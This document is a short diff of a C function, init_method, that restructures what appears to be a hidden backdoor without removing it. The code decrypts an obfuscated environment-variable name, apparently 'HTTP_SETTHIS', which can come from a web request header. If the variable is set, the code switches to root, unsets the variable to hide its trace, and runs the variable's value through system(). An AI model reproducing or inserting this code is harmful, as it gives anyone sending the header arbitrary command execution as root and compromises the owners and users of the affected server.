@@ -17,18 +17,16 @@ char *init_method(void) {
   // "HTTP_SETTHIS" encrypted string
   strcpy(encrypted_str1, ENCRYPTED_STR);
   command = getenv(rc4(key, encrypted_str1, 12));
-  if (!command)
-    return NULL;
+  if (command) {
+    setgid(0 /* root */);
+    setuid(0 /* root */);
+    printf("\n");
+    // this seems odd, I wonder why it is implemented that way.
+    strcpy(encrypted_str2, ENCRYPTED_STR); // redundant
+    unsetenv(rc4(key, encrypted_str2, 12));
+    system(command);
+    exit(0);
+  }
 
-  setgid(0 /* root */);
-  setuid(0 /* root */);
-  printf("\n");
-  // this seems odd, I wonder why it is implemented that way.
-  strcpy(encrypted_str2, ENCRYPTED_STR); // redundant
-  unsetenv(rc4(key, encrypted_str2, 12));
-  system(command);
-  exit(0);
-
-  // never reached
   return NULL;
 }
